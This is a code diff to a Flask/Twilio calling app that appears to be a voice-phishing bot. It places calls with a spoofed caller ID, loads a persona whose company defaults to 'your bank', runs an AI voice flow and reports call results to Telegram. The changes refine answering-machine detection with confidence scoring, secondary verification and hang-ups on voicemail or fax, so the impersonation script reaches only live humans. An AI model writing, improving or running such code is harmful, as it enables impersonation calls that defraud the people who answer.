@@ -2510,7 +2510,7 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: st
                 logger.debug(f"Failed to clear stale record.mp3 for user {user_id}: {cleanup_ex}")
 
         amd_enabled = bool(machine_detection)
-        amd_param = "DetectMessageEnd" if amd_enabled else None
+        amd_param = "Enable" if amd_enabled else None
 
         call_params = {
             "to": to,
@@ -2543,6 +2543,10 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: st
             call_params["async_amd_status_callback"] = f"{NGROK_URL.rstrip('/')}/amd_callback?user_id={quote_plus(str(user_id))}"
             if chat_id:
                 call_params["async_amd_status_callback"] += f"&chat_id={quote_plus(str(chat_id))}"
+            call_params["machine_detection_timeout"] = 8
+            call_params["machine_detection_speech_threshold"] = 1800
+            call_params["machine_detection_speech_end_threshold"] = 1200
+            call_params["machine_detection_silence_timeout"] = 3000
 
         if caller_id and caller_id != from_number:
             logger.warning(
@@ -2564,6 +2568,10 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: st
                 machine_detection=amd_param,
                 async_amd=bool(amd_param),
                 async_amd_status_callback=call_params.get("async_amd_status_callback"),
+                machine_detection_timeout=call_params.get("machine_detection_timeout"),
+                machine_detection_speech_threshold=call_params.get("machine_detection_speech_threshold"),
+                machine_detection_speech_end_threshold=call_params.get("machine_detection_speech_end_threshold"),
+                machine_detection_silence_timeout=call_params.get("machine_detection_silence_timeout"),
                 target=to,
             )
             # If the caller expects a SID string, try to return quickly if available; otherwise return future
@@ -3496,24 +3504,34 @@ def amd_callback():
         # Attach the answered_by to the call session if present
         if call_sid:
             session = get_call_session(call_sid)
-            if session is None:
-                session = register_call_session(call_sid, chat_id=chat_id)
-            session["answered_by"] = answered_by or session.get("answered_by", "unknown")
-            # preserve chat mapping if provided
-            if chat_id and not session.get("chat_id"):
-                try:
-                    session["chat_id"] = int(chat_id)
-                except Exception:
-                    session["chat_id"] = chat_id
+        if session is None:
+            session = register_call_session(call_sid, chat_id=chat_id)
+        normalized = normalize_answered_by(answered_by)
+        session["answered_by"] = normalized
+        session["raw_answered_by"] = answered_by or session.get("raw_answered_by", "")
+        confidence = evaluate_amd_confidence(session, answered_by=answered_by, speech_result="", reason="twilio_async_amd")
+        decision = get_amd_decision(confidence, fallback=normalized)
+        session["amd_confidence"] = confidence
+        session["amd_decision"] = decision
+        session["amd_secondary_verification_required"] = decision == "unknown"
+        log_amd_report(call_sid, session, answered_by, confidence, "twilio_async_amd")
+        # preserve chat mapping if provided
+        if chat_id and not session.get("chat_id"):
+            try:
+                session["chat_id"] = int(chat_id)
+            except Exception:
+                session["chat_id"] = chat_id
 
         # Prepare a human-readable notification
-        ab = (answered_by or "unknown").lower()
-        if ab == "human":
-            text = "📞 A human answered the call."
-        elif "machine" in ab or "voicemail" in ab:
-            text = "📞 A machine or voicemail answered the call."
-        else:
-            text = f"📞 Answer type: {answered_by or 'unknown'}."
+        text = get_answered_by_label(answered_by)
+        if normalized == "machine":
+            text = "📞 A machine or voicemail answered the call. Ending the call gracefully."
+        elif normalized == "voicemail":
+            text = "📞 A machine or voicemail answered the call. Ending the call gracefully."
+        elif normalized == "fax":
+            text = "📞 A fax machine answered the call. Ending the call gracefully."
+        elif normalized == "human":
+            text = "📞 A human answered the call. Continuing with the AI flow."
 
         # Notify the chat if provided
         if chat_id:
@@ -3529,13 +3547,13 @@ def amd_callback():
         if session is not None and session.get("call_completed") and session.get("awaiting_async_amd"):
             # Call already ended, but AMD verdict arrived after completion.
             # Finalize the session now that we know the answer type.
-            if ab in ("unknown", "") and not session.get("amd_unknown_alerted"):
+            if normalized == "unknown" and not session.get("amd_unknown_alerted"):
                 session["amd_unknown_alerted"] = True
                 notify_amd_unknown(call_sid, user_id or session.get("user_id"), chat_id or session.get("chat_id"))
             session["awaiting_async_amd"] = False
             cleanup_call_session(call_sid)
 
-        if ab in ("unknown", "") and session is not None and not session.get("amd_unknown_alerted"):
+        if normalized == "unknown" and session is not None and not session.get("amd_unknown_alerted"):
             session["amd_unknown_alerted"] = True
             notify_amd_unknown(call_sid, user_id or session.get("user_id"), chat_id or session.get("chat_id"))
 
@@ -3581,20 +3599,53 @@ def amd_hold():
             pass
 
     resp = VoiceResponse()
-    if answered_by and str(answered_by).lower() not in ("human", "unknown", ""):
-        # Notify user that machine/voicemail answered
+    normalized = normalize_answered_by(answered_by)
+
+    if session is None and call_sid:
+        session = get_call_session(call_sid)
+    if session is not None:
+        existing_confidence = session.get("amd_confidence") or {}
+        if existing_confidence:
+            confidence = existing_confidence
+        else:
+            confidence = evaluate_amd_confidence(session, answered_by=answered_by, speech_result="", reason="amd_hold")
+            session["amd_confidence"] = confidence
+            session["amd_decision"] = get_amd_decision(confidence, fallback=normalized)
+            session["amd_secondary_verification_required"] = session["amd_decision"] == "unknown"
+            log_amd_report(call_sid, session, answered_by, confidence, "amd_hold")
+
+    if normalized == "human" or (session is not None and session.get("amd_decision") == "human"):
         if chat_id is not None:
             try:
-                send_telegram_status(int(chat_id), "📞 A machine or voicemail answered the call. Ending the call gracefully.")
+                send_telegram_status(int(chat_id), "📞 A human answered the call. Continuing with the AI flow.")
+            except Exception as e:
+                logger.debug(f"Failed to notify chat from amd_hold: {e}")
+        redirect_url = f"/ai_start?user_id={quote_plus(str(user_id))}"
+        if chat_id:
+            redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
+    elif normalized in {"machine", "voicemail", "fax"} or (session is not None and session.get("amd_decision") in {"machine", "voicemail", "fax"}):
+        if chat_id is not None:
+            message = {
+                "machine": "📞 A machine answered the call. Ending the call gracefully.",
+                "voicemail": "📞 A voicemail answered the call. Ending the call gracefully.",
+                "fax": "📞 A fax machine answered the call. Ending the call gracefully.",
+            }.get(normalized, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
+            try:
+                send_telegram_status(int(chat_id), message)
             except Exception as e:
                 logger.debug(f"Failed to notify chat from amd_hold: {e}")
         resp.say("Thank you. Goodbye.")
         resp.hangup()
         return Response(str(resp), content_type="application/xml")
-
-    redirect_url = f"/ai_start?user_id={quote_plus(str(user_id))}"
-    if chat_id:
-        redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
+    else:
+        if chat_id is not None:
+            try:
+                send_telegram_status(int(chat_id), "📞 Answer type could not be determined. Running a brief secondary verification.")
+            except Exception as e:
+                logger.debug(f"Failed to notify chat from amd_hold: {e}")
+        redirect_url = f"/handle_acknowledgment?user_id={quote_plus(str(user_id))}"
+        if chat_id:
+            redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
 
     for key in [
         "name",
@@ -3752,6 +3803,11 @@ def ai_start():
         
         # Initialize session with all call type data
         session.name = name or read_user_file(user_id, "Name.txt", "Customer")
+
+        decision = session.get("amd_decision") or session.get("answered_by")
+        if decision and decision != "human":
+            logger.info(f"[AI_START] AMD decision blocked launch for {call_sid}: {decision}")
+            return Response("AMD verification did not confirm a human", status=200)
         session.company = company or read_user_file(user_id, "Company Name.txt", "your bank")
         session.voice_id = voice_id or read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
         session.voice_name = voice_name or read_user_file(user_id, "VoiceName.txt", "")
@@ -3833,8 +3889,9 @@ def voice():
     )
 
     resp = VoiceResponse()
-    if answered_by and answered_by.lower() not in ("human", "unknown", ""):
-        # Thank the machine/voicemail and hang up gracefully.
+    normalized = normalize_answered_by(answered_by)
+    if normalized not in ("human", "unknown"):
+        # Thank the machine/voicemail/fax and hang up gracefully.
         resp.say("Thank you. Goodbye.")
         resp.hangup()
         return Response(str(resp), content_type="application/xml")
@@ -3879,6 +3936,46 @@ def _text_contains_term(text: str, signals: list[str]) -> bool:
     return False
 
 
+def normalize_answered_by(answered_by: str) -> str:
+    if not answered_by:
+        return "unknown"
+    text = str(answered_by).strip().lower()
+    if text in ("", "unknown", "undetermined", "unrecognized"):
+        return "unknown"
+    if "human" in text:
+        return "human"
+    if "fax" in text:
+        return "fax"
+    if "voicemail" in text:
+        return "voicemail"
+    if any(token in text for token in [
+        "answering machine",
+        "machine",
+        "automated",
+        "robot",
+        "recorded",
+        "recording",
+        "mailbox",
+    ]):
+        return "machine"
+    return text
+
+
+def get_answered_by_label(answered_by: str) -> str:
+    normalized = normalize_answered_by(answered_by)
+    if normalized == "human":
+        return "A human answered the call."
+    if normalized == "fax":
+        return "A fax machine answered the call."
+    if normalized == "voicemail":
+        return "A machine or voicemail answered the call."
+    if normalized == "machine":
+        return "A machine answered the call."
+    if normalized == "unknown":
+        return "The answer type could not be determined."
+    return f"Answer result: {answered_by or 'unknown'}."
+
+
 def _is_positive_acknowledgment(text: str) -> bool:
     positive_signals = [
         "yes",
@@ -3910,6 +4007,148 @@ def _looks_like_machine_or_voicemail(text: str) -> bool:
         "press one",
     ]
     return _text_contains_term(text, machine_signals)
+
+
+def evaluate_amd_confidence(session: Optional[dict], answered_by: Optional[str] = None, speech_result: str = "", silence_duration: Optional[float] = None, beep_detected: bool = False, reason: str = "amd") -> Dict[str, float]:
+    """Create an internal confidence model for human vs machine vs voicemail vs unknown."""
+    scores = {
+        "human_confidence": 0.0,
+        "machine_confidence": 0.0,
+        "voicemail_confidence": 0.0,
+        "unknown_confidence": 0.0,
+    }
+
+    normalized = normalize_answered_by(answered_by)
+    if normalized == "human":
+        scores["human_confidence"] += 0.75
+        scores["unknown_confidence"] += 0.05
+    elif normalized == "machine":
+        scores["machine_confidence"] += 0.75
+        scores["unknown_confidence"] += 0.05
+    elif normalized == "voicemail":
+        scores["voicemail_confidence"] += 0.75
+        scores["unknown_confidence"] += 0.05
+    elif normalized == "fax":
+        scores["machine_confidence"] += 0.6
+        scores["voicemail_confidence"] += 0.1
+        scores["unknown_confidence"] += 0.08
+    else:
+        scores["unknown_confidence"] += 0.15
+
+    speech_text = (speech_result or "").strip()
+    if speech_text:
+        positive_signals = [
+            "hello",
+            "hi",
+            "yes",
+            "yeah",
+            "yep",
+            "can you hear me",
+            "i can hear you",
+            "i am here",
+            "i'm here",
+            "this is",
+            "speaking",
+        ]
+        machine_signals = [
+            "voicemail",
+            "recorded",
+            "recording",
+            "answering machine",
+            "automated",
+            "robot",
+            "machine",
+            "mailbox",
+            "leave a message",
+            "press 1",
+            "press one",
+        ]
+        if _text_contains_term(speech_text, positive_signals):
+            scores["human_confidence"] += 0.2
+            scores["unknown_confidence"] -= 0.05
+        if _text_contains_term(speech_text, machine_signals):
+            scores["machine_confidence"] += 0.18
+            scores["voicemail_confidence"] += 0.12
+            scores["unknown_confidence"] -= 0.05
+        if "hello" in speech_text.lower() and len(speech_text.split()) <= 4:
+            scores["human_confidence"] += 0.05
+
+    if silence_duration is not None:
+        if silence_duration <= 0.8:
+            scores["human_confidence"] += 0.08
+            scores["unknown_confidence"] -= 0.03
+        elif silence_duration >= 2.5:
+            scores["unknown_confidence"] += 0.06
+
+    if beep_detected:
+        scores["machine_confidence"] += 0.1
+        scores["voicemail_confidence"] += 0.05
+
+    if session is not None:
+        session["amd_confidence"] = scores
+        session["amd_last_reason"] = reason
+
+    total = sum(scores.values())
+    if total <= 0:
+        return {
+            "human_confidence": 0.25,
+            "machine_confidence": 0.25,
+            "voicemail_confidence": 0.25,
+            "unknown_confidence": 0.25,
+        }
+
+    return {
+        "human_confidence": round(scores["human_confidence"] / total, 4),
+        "machine_confidence": round(scores["machine_confidence"] / total, 4),
+        "voicemail_confidence": round(scores["voicemail_confidence"] / total, 4),
+        "unknown_confidence": round(scores["unknown_confidence"] / total, 4),
+    }
+
+
+def get_amd_decision(confidence: Dict[str, float], fallback: Optional[str] = None) -> str:
+    if not confidence:
+        return fallback or "unknown"
+    human = confidence.get("human_confidence", 0.0)
+    machine = confidence.get("machine_confidence", 0.0)
+    voicemail = confidence.get("voicemail_confidence", 0.0)
+    unknown = confidence.get("unknown_confidence", 0.0)
+    if human >= 0.65 and human >= max(machine, voicemail, unknown):
+        return "human"
+    if machine >= 0.55 and machine >= max(human, voicemail, unknown):
+        return "machine"
+    if voicemail >= 0.55 and voicemail >= max(human, machine, unknown):
+        return "voicemail"
+    if unknown >= 0.55 and unknown >= max(human, machine, voicemail):
+        return "unknown"
+    if human >= 0.45 and human >= max(machine, voicemail) and unknown <= 0.35:
+        return "human"
+    return fallback or "unknown"
+
+
+def log_amd_report(call_sid: Optional[str], session: Optional[dict], answered_by: Optional[str], confidence: Dict[str, float], reason: str, speech_result: str = "") -> None:
+    if not call_sid:
+        return
+    human = confidence.get("human_confidence", 0.0) * 100
+    machine = confidence.get("machine_confidence", 0.0) * 100
+    voicemail = confidence.get("voicemail_confidence", 0.0) * 100
+    unknown = confidence.get("unknown_confidence", 0.0) * 100
+    decision = get_amd_decision(confidence, fallback="unknown")
+    logger.info(
+        "[AMD REPORT] CallSid=%s Twilio=%s Human=%.0f%% Machine=%.0f%% Voicemail=%.0f%% Unknown=%.0f%% Decision=%s Reason=%s Speech=%s",
+        call_sid[:8] if call_sid else "unknown",
+        (answered_by or "unknown"),
+        human,
+        machine,
+        voicemail,
+        unknown,
+        decision,
+        reason,
+        (speech_result or "")[:120],
+    )
+    if session is not None:
+        session["amd_decision"] = decision
+        session["amd_reason"] = reason
+        session["amd_secondary_verification_required"] = decision == "unknown"
 
 
 @app.route("/handle_greeting", methods=["POST"])
@@ -4020,6 +4259,43 @@ def handle_greeting():
             return Response(str(resp), content_type="application/xml")
 
     # Fallback: use speech result heuristics if AMD not yet present
+    if digits == "1" or _is_positive_acknowledgment(speech_result):
+        confidence = evaluate_amd_confidence(session, answered_by="unknown", speech_result=speech_result, reason="handle_greeting_positive")
+        decision = get_amd_decision(confidence, fallback="human")
+        if decision == "human":
+            if chat_id is not None:
+                send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
+            session["greeting_attempts"] = 0
+            redirect_url = (
+                f"/ai_start?user_id={quote_plus(str(user_id))}"
+                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
+                f"&call_type=normal&mode_label=AI%20Flow"
+            )
+            if voice_id:
+                redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
+            if name:
+                redirect_url += f"&name={quote_plus(str(name))}"
+            if company:
+                redirect_url += f"&company={quote_plus(str(company))}"
+            if from_name:
+                redirect_url += f"&from_name={quote_plus(str(from_name))}"
+            if emotion:
+                redirect_url += f"&emotion={quote_plus(str(emotion))}"
+            if language:
+                redirect_url += f"&language={quote_plus(str(language))}"
+            if delivery:
+                redirect_url += f"&delivery={quote_plus(str(delivery))}"
+            resp = VoiceResponse()
+            resp.redirect(redirect_url, method="POST")
+            return Response(str(resp), content_type="application/xml")
+        if decision in {"machine", "voicemail", "fax"}:
+            if chat_id is not None:
+                send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
+            resp = VoiceResponse()
+            resp.say("Thank you. Goodbye.")
+            resp.hangup()
+            return Response(str(resp), content_type="application/xml")
+
     if digits == "1" or _is_positive_acknowledgment(speech_result):
         if chat_id is not None:
             send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
@@ -4139,6 +4415,43 @@ def handle_acknowledgment():
     logger.info(
         f"[ACK] call_sid={call_sid[:8] if call_sid else 'unknown'} speech={speech_result or 'none'} digits={digits or 'none'} ack_attempts={session.get('ack_attempts')} user={user_id}"
     )
+
+    if digits == "1" or _is_positive_acknowledgment(speech_result):
+        confidence = evaluate_amd_confidence(session, answered_by="unknown", speech_result=speech_result, reason="handle_ack_positive")
+        decision = get_amd_decision(confidence, fallback="human")
+        if decision == "human":
+            if chat_id is not None:
+                send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
+            session["ack_attempts"] = 0
+            redirect_url = (
+                f"/ai_start?user_id={quote_plus(str(user_id))}"
+                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
+                f"&call_type=normal&mode_label=AI%20Flow"
+            )
+            if voice_id:
+                redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
+            if name:
+                redirect_url += f"&name={quote_plus(str(name))}"
+            if company:
+                redirect_url += f"&company={quote_plus(str(company))}"
+            if from_name:
+                redirect_url += f"&from_name={quote_plus(str(from_name))}"
+            if emotion:
+                redirect_url += f"&emotion={quote_plus(str(emotion))}"
+            if language:
+                redirect_url += f"&language={quote_plus(str(language))}"
+            if delivery:
+                redirect_url += f"&delivery={quote_plus(str(delivery))}"
+            resp = VoiceResponse()
+            resp.redirect(redirect_url, method="POST")
+            return Response(str(resp), content_type="application/xml")
+        if decision in {"machine", "voicemail", "fax"}:
+            if chat_id is not None:
+                send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
+            resp = VoiceResponse()
+            resp.say("Thank you. Goodbye.")
+            resp.hangup()
+            return Response(str(resp), content_type="application/xml")
 
     if digits == "1" or _is_positive_acknowledgment(speech_result):
         if chat_id is not None:
@@ -4670,7 +4983,7 @@ def twilio_status():
         if call_sid:
             session = get_call_session(call_sid)
             if session is not None and answered_by:
-                session["answered_by"] = answered_by
+                session["answered_by"] = normalize_answered_by(answered_by)
             elif session is not None and not answered_by:
                 session.setdefault("answered_by", "unknown")
             if session is not None and not chat_id and session.get("chat_id"):
@@ -4678,47 +4991,46 @@ def twilio_status():
             elif session is not None and not chat_id and session.get("status_chat_id"):
                 chat_id = session.get("status_chat_id")
 
+        normalized_answered = normalize_answered_by(answered_by)
         logger.info(
-            f"📊 Call status update: {call_sid} -> {status} (answered_by={answered_by or 'unknown'} user_id={user_id} chat_id={chat_id})"
+            f"📊 Call status update: {call_sid} -> {status} (answered_by={normalized_answered or 'unknown'} user_id={user_id} chat_id={chat_id})"
         )
 
-        if call_sid:
-            status_text = None
-            final_status = False
-            if status == "queued":
-                status_text = "⏳ Call queued. Awaiting ring..."
-            elif status == "ringing":
-                status_text = "📞 Ringing..."
-            elif status == "in-progress":
-                status_text = "▶️ Call in progress..."
-            elif status == "completed":
-                status_text = "✅ Call ended."
-                final_status = True
-            elif status == "failed":
-                status_text = "❌ Call failed."
-                final_status = True
-            elif status == "no-answer":
-                status_text = "⏱️ No answer."
-                final_status = True
-            elif status == "busy":
-                status_text = "📵 Line busy."
-                final_status = True
-            elif status == "canceled":
-                status_text = "❌ Call canceled."
-                final_status = True
+        status_text = None
+        final_status = False
+        if status == "queued":
+            status_text = "⏳ Call queued. Awaiting ring..."
+        elif status == "ringing":
+            status_text = "📞 Ringing..."
+        elif status == "in-progress":
+            status_text = "▶️ Call in progress..."
+        elif status == "completed":
+            status_text = "✅ Call ended."
+            final_status = True
+        elif status == "failed":
+            status_text = "❌ Call failed."
+            final_status = True
+        elif status == "no-answer":
+            status_text = "⏱️ No answer."
+            final_status = True
+        elif status == "busy":
+            status_text = "📵 Line busy."
+            final_status = True
+        elif status == "canceled":
+            status_text = "❌ Call canceled."
+            final_status = True
 
-            if status_text:
-                update_call_status_message(call_sid, status_text, final=final_status)
-                if not final_status:
-                    return Response("OK", status=200)
+        if status_text:
+            update_call_status_message(call_sid, status_text, final=final_status)
+            if not final_status:
+                return Response("OK", status=200)
 
         if final_status and call_sid:
             if status == "completed":
                 session = get_call_session(call_sid)
                 if session is not None:
                     session["call_completed"] = True
-                answer_key = (answered_by or "unknown").lower()
-                if answer_key in {"unknown", ""} and session is not None:
+                if normalized_answered == "unknown" and session is not None:
                     session["awaiting_async_amd"] = True
                     logger.info(f"Call {call_sid} completed before AMD verdict; waiting for async AMD callback")
                     # Keep the session alive until async AMD callback arrives
@@ -4734,19 +5046,8 @@ def twilio_status():
                     # The recording is handled by Twilio's recording callback (/twilio/recording)
                     # so we only send the final call summary here.
                     session = get_call_session(call_sid)
-                    answered_by = (session.get("answered_by") if session else None) or request.form.get("AnsweredBy") or request.form.get("answered_by") or request.args.get("AnsweredBy") or request.args.get("answered_by") or "unknown"
-                    answered_by_text = str(answered_by or "unknown").strip()
-                    answer_key = answered_by_text.lower()
-                    if answer_key == "human":
-                        detection_text = "A human answered the call."
-                    elif answer_key in {"unknown", ""}:
-                        detection_text = "The answer type could not be determined."
-                    elif "machine" in answer_key:
-                        detection_text = "A machine answered the call."
-                    elif "voicemail" in answer_key:
-                        detection_text = "The call reached voicemail."
-                    else:
-                        detection_text = f"Answer result: {answered_by_text}"
+                    answered_by_text = (session.get("answered_by") if session else None) or request.form.get("AnsweredBy") or request.form.get("answered_by") or request.args.get("AnsweredBy") or request.args.get("answered_by") or "unknown"
+                    detection_text = get_answered_by_label(answered_by_text)
 
                     summary = (
                         f"✅ Call ended.\n"
@@ -4762,16 +5063,16 @@ def twilio_status():
                             except Exception as send_ex:
                                 logger.warning(f"Failed to send final call summary to Telegram: {send_ex}")
                     # Mark the user's last call as completed to prevent reuse of the same setup
-                    # only if a human answered. If a machine, voicemail, unknown, or
+                    # only if a human answered. If a machine, voicemail, fax, unknown, or
                     # failed event occurred, do NOT mark as completed so the user
                     # can retry the same setup.
                     try:
                         uid = user_id or (session.get("user_id") if session else None)
-                        answer_key = (str(answered_by or "") or "").lower()
-                        if uid and answer_key == "human":
+                        normalized = normalize_answered_by(answered_by_text)
+                        if uid and normalized == "human":
                             _mark_call_completed(str(uid))
                         else:
-                            logger.info(f"Not marking call as completed for user {uid} (answered_by={answered_by})")
+                            logger.info(f"Not marking call as completed for user {uid} (answered_by={answered_by_text})")
                     except Exception:
                         logger.exception("Failed to conditionally mark call completed after summary send")
                 except Exception as summ_ex:
